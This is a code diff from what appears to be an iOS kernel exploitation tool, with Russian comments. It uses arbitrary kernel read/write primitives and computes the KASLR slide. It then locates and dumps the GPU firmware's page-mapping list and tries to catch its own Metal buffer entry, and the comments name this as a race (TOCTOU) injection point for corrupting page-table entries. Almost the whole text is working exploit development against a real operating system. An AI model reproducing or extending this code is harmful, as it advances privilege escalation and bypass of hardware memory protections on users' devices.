@@ -5341,26 +5341,57 @@ static BOOL kpHuntPtrOK(uint64_t v)
     extern uint64_t kp_rc_kread64(uint64_t);
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
 
-    // === COMPACTED-LIST hunt: trust boundary (RE, подтверждён дизасмом):
-    //     ядро пишет compacted list {gpuVA, PA>>14} (stride 0x10) в shared
-    //     DRAM перед GXF c4-commit, FW читает лист и программирует PTE.
-    //     Ищем этот буфер: sig-scan страниц буфера → needle-scan qword==gpuVA
-    //     по всем читаемым типам (кроме read-fault 0x13/0x14) → соседи PA>>14.
-    //     Если буфер в 0x21/0x0b — он ПИШЕТСЯ → точка инъекции (TOCTOU).
+    // === LIST-ADDR: compacted list {VA, PA>>14} по формуле RE:
+    //     cpuData = 0xfffffff00aa44000 + slide (cpu0 template)
+    //     slotVA  = 0xfffffff00aa48000 + slide + (kread(cpuData+0x1a0) >> 16)
+    //     bufVA   = kread(slotVA + 8)
+    //     Дамп записей, frame type буфера, live-catch нашей записи после
+    //     submit. Если буфер writable (0x21/0x0b) — следующая сборка race.
     extern uint64_t kp_rc_kread64(uint64_t);
+    uint64_t kc = kconstant(base);
+    uint64_t slide = kc - 0xfffffff007004000ULL;
+    uint64_t cpuData = 0xfffffff00aa44000ULL + slide;
+    uint64_t val = kp_rc_kread64(cpuData + 0x1a0);
+    uint64_t slotVA = 0xfffffff00aa48000ULL + slide + (val >> 16);
+    uint64_t bufVA = kp_rc_kread64(slotVA + 8);
+    // альтернативная интерпретация (константа уже runtime-форма, без slide):
+    uint64_t slotVA2 = 0xfffffff00aa48000ULL + (val >> 16);
+    uint64_t bufVA2 = kp_rc_kread64(slotVA2 + 8);
+    GNOTE( [NSString stringWithFormat:@"  slide=%#llx val(+0x1a0)=%#llx", slide, val]);
+    GNOTE( [NSString stringWithFormat:@"  A: slotVA=%#llx bufVA=%#llx", slotVA, bufVA]);
+    GNOTE( [NSString stringWithFormat:@"  B(no-slide): slotVA=%#llx bufVA=%#llx", slotVA2, bufVA2]);
+    if (!kpLooksLikeKernelPointer(bufVA) && kpLooksLikeKernelPointer(bufVA2)) {
+        GNOTE( @"  интерпретация A невалидна — берём B");
+        bufVA = bufVA2;
+    }
+    if (!kpLooksLikeKernelPointer(bufVA)) { GNOTE( @"FAIL: bufVA не kernel pointer"); gGartLive = NO; return r; }
 
-    // 3a. bufB + сигнатурный шейдер (17 потоков = 17 страниц)
+    uint64_t tableVA = [self frameTableVAWithLog:r];
+    int ft = kpVAType(bufVA, tableVA);
+    GNOTE( [NSString stringWithFormat:@"  bufVA=%#llx frame type=0x%x %@", bufVA, ft,
+               (ft == 0x21 || ft == 0x0b) ? @"— ПИШЕТСЯ, race возможен!" :
+               ft == 0x37 ? @"— per-CPU (читается, запись = EL2-килл)" : @""]);
+
+    // дамп 16 записей (stride 0x10: {VA, PA>>14})
+    GNOTE( @"  --- 16 записей листа (rest state):");
+    for (int i = 0; i < 16; i++) {
+        uint64_t va = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
+        uint64_t pa14 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
+        if (va || pa14)
+            GNOTE( [NSString stringWithFormat:@"    [%2d] VA=%#llx PA=%#llx", i, va, pa14 << 14]);
+    }
+
+    // live-catch: создаём private-буфер, submit, сразу перечитываем лист —
+    // наши записи {gpuVA, PA>>14} должны мелькнуть.
     id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
     id<MTLBuffer> bufB = mtl ? [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate] : nil;
     if (!bufB) { GNOTE( @"FAIL: private buffer"); gGartLive = NO; return r; }
     uint64_t gvaB = (uint64_t)bufB.gpuAddress;
-    GNOTE( [NSString stringWithFormat:@"  priv B: gpuAddr=%#llx len=0x44000 (17 страниц сигнатур)", gvaB]);
+    GNOTE( [NSString stringWithFormat:@"  live-catch: priv B gpuAddr=%#llx — submit и перечитываю", gvaB]);
     @autoreleasepool {
         NSError *err = nil;
-        id<MTLLibrary> lib = [mtl newLibraryWithSource:
-            @"kernel void sg(device ulong *o [[buffer(0)]], uint i [[thread_position_in_grid]]) { device ulong *p = (device ulong *)((device char *)o + (ulong)i * 0x4000); p[0] = 0x4242424242424242UL; p[1] = 0x1337133713371337UL; }"
-            options:nil error:&err];
-        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"sg"] : nil;
+        id<MTLLibrary> lib = [mtl newLibraryWithSource:@"kernel void wf(device ulong *o [[buffer(0)]]) { o[0] = 1; }" options:nil error:&err];
+        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"wf"] : nil;
         id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
         id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
         id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
@@ -5368,92 +5399,23 @@ static BOOL kpHuntPtrOK(uint64_t v)
         if (enc) {
             [enc setComputePipelineState:pipe];
             [enc setBuffer:bufB offset:0 atIndex:0];
-            [enc dispatchThreads:MTLSizeMake(17,1,1) threadsPerThreadgroup:MTLSizeMake(17,1,1)];
+            [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
             [enc endEncoding];
             [cb commit];
             [cb waitUntilCompleted];
-            GNOTE( [NSString stringWithFormat:@"  submit B(сигнатуры): status=%ld %@", (long)cb.status, cb.error ? cb.error.description : @"ok"]);
-        } else GNOTE( [NSString stringWithFormat:@"  submit B: оборвался: %@", err]);
-    }
-
-    // 3b. frame table enum ЧАНКАМИ: гистограмма + мастер-список {ppn,type}
-    uint64_t tableVA = [self frameTableVAWithLog:r];
-    if (!tableVA) { GNOTE( @"FAIL: frame table"); gGartLive = NO; return r; }
-    uint64_t pb = kconstant(physBase), ps = kconstant(physSize);
-    uint32_t totalPages = (uint32_t)(ps >> 14);
-    uint32_t *heapPages = malloc((size_t)totalPages * 4);
-    uint64_t *allPages = malloc((size_t)totalPages * 8);
-    if (!heapPages || !allPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
-    uint32_t nheap = 0, nall = 0;
-    uint32_t typeCount[256]; memset(typeCount, 0, sizeof(typeCount));
-    {
-        uint8_t fch[0x1000];
-        for (uint32_t base2 = 0; base2 < totalPages; base2 += 256) {
-            uint32_t n = totalPages - base2; if (n > 256) n = 256;
-            kreadbuf(tableVA + (uint64_t)base2 * 16, fch, (size_t)n * 16);
-            for (uint32_t j = 0; j < n; j++) {
-                uint8_t ft = fch[j * 16 + 2];
-                typeCount[ft]++;
-                allPages[nall++] = (uint64_t)(base2 + j) | ((uint64_t)ft << 32);
-                if (ft == 0x21 || ft == 0x0b) heapPages[nheap++] = base2 + j;
-            }
-            if (base2 && (base2 & 0xFFFF) == 0)
-                GNOTE( [NSString stringWithFormat:@"  enum: %u/%u страниц…", base2, totalPages]);
         }
+        GNOTE( [NSString stringWithFormat:@"  submit: status=%ld %@", (long)cb.status, cb.error ? cb.error.description : @"ok"]);
     }
-
-    // 3c. sig-скан heap-страниц → PA страниц bufB
-    uint64_t sigPA[40]; int nsig = 0;
-    for (uint32_t i = 0; i < nheap && nsig < 40; i++) {
-        uint64_t pa = pb + ((uint64_t)heapPages[i] << 14);
-        uint64_t va = gPrimitives.phystokv(pa);
-        uint8_t two[16];
-        kreadbuf(va, two, 16);
-        uint64_t s0, s1;
-        memcpy(&s0, two, 8); memcpy(&s1, two + 8, 8);
-        if (s0 != 0x4242424242424242ULL || s1 != 0x1337133713371337ULL) continue;
-        sigPA[nsig++] = pa;
-        GNOTE( [NSString stringWithFormat:@"★ bufB страница #%d: PA=%#llx", nsig - 1, pa]);
+    int caught = 0;
+    for (int i = 0; i < 64; i++) {
+        uint64_t va = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
+        uint64_t pa14 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
+        if (!va && !pa14) continue;
+        NSString *mark = (va == gvaB) ? @"  ◄◄◄ НАША ЗАПИСЬ!" : @"";
+        GNOTE( [NSString stringWithFormat:@"    [%2d] VA=%#llx PA=%#llx%@", i, va, pa14 << 14, mark]);
+        if (va == gvaB) caught++;
     }
-    GNOTE( [NSString stringWithFormat:@"  sig-скан: найдено %d страниц bufB", nsig]);
-
-    // 3d. needle-scan qword==gpuVA по всем читаемым типам (skip 0x13/0x14).
-    //     На хите: контекст ±4 и проверка соседей на PA>>14 нашего буфера —
-    //     это и есть compacted list. Плюс frame type страницы-хозяина.
-    if (nsig) {
-        int hits = 0;
-        for (uint32_t i = 0; i < nall && hits < 16; i++) {
-            uint8_t t = (uint8_t)(allPages[i] >> 32);
-            if (t != 0x21 && t != 0x0b && t != 0x37) continue;   // только доказанно читаемые (v12: часть типов — EL2-ресет даже на чтении)
-            uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
-            uint64_t va = gPrimitives.phystokv(pa);
-            uint8_t pgch[0x1000];
-            for (int seg = 0; seg < 4 && hits < 16; seg++) {
-                kreadbuf(va + (uint64_t)seg * 0x1000, pgch, 0x1000);
-                for (int q = 0; q < 512; q++) {
-                    uint64_t v;
-                    memcpy(&v, pgch + q * 8, 8);
-                    if (v != gvaB) continue;
-                    GNOTE( [NSString stringWithFormat:@"★ gpuVA НАЙДЕН: type=0x%02x page=%#llx slot=%d", t, pa, seg * 512 + q]);
-                    for (int c = q - 4; c <= q + 4; c++) {
-                        if (c < 0 || c >= 512) continue;
-                        uint64_t cv;
-                        memcpy(&cv, pgch + c * 8, 8);
-                        NSString *mark = @"";
-                        for (int ni = 0; ni < nsig; ni++)
-                            if (cv == (sigPA[ni] >> 14)) { mark = [NSString stringWithFormat:@"  ◄◄◄ PA>>14 bufB[%d]!", ni]; break; }
-                        GNOTE( [NSString stringWithFormat:@"    ctx[%+d] = %#llx%@", c - q, cv, mark]);
-                    }
-                    hits++;
-                    break;
-                }
-            }
-            if (i && (i & 0x3FFF) == 0)
-                GNOTE( [NSString stringWithFormat:@"  needle-скан: %u/%u…", i, nall]);
-        }
-        GNOTE( [NSString stringWithFormat:@"  needle-скан: hits=%d (gpuVA %#llx)", hits, gvaB]);
-    }
-    free(heapPages); free(allPages);
+    GNOTE( [NSString stringWithFormat:@"  live-catch: наших записей=%d · вердикт буфера ft=0x%x", caught, ft]);
     gGartLive = NO;
     return r;
 }
